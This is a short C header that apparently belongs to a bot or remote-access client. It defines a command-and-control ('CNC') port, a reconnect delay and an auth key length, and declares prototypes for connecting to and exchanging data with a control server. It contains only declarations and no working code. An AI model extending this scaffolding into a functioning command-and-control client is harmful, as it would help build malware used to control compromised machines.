#include <stdio.h>

#define CNC_PORT "8159"
#define SLEEP_INTERVAL_ON_CONNERROR_MS 30 * 1000

#define AUTH_KEY_LEN 36

void cnc_init_conn();
int cnc_send(void *buf, size_t len);
int cnc_recv(void *buf, size_t len);
int cnc_recvall(void *buf, size_t len);
